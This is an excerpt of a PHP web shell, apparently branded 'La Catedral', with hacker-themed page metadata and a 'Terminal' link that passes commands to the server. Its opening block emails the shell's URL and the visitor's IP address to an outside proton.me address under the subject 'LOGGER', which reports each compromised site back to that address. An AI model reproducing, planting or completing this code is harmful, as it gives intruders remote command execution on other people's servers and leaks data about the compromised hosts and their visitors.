...
$sendmail = 'kosameamegai@proton.me';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$massage_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($sendmail, "LOGGER", $massage_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
error_reporting(0);
...
<head>
    ...
    <meta name="description" content="la seguridad es solo una ilusión">
    <meta property="og:description" content="la seguridad es solo una ilusión">
    <meta property="og:image" content="https://1.bp.blogspot.com/-dHzdk7YWCck/XvioPGS6ZmI/AAAAAAAABUk/FKTLIhkwoyobZ1fKx0radWgpLbbATmNcQCK4BGAsYHg/s779/fsociety2.png">
...
<center>
<font face="Bungee" size="5">./La Catedral\.</font></center>
...
function author() {
    echo "<center><br>Medellin Cartel - Cocaine</center>";
    exit();
}
...
echo "PHP Version : <font color='gold'>".@phpversion()."</font>";
...
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">Terminal</a>&nbsp; ]</th>';
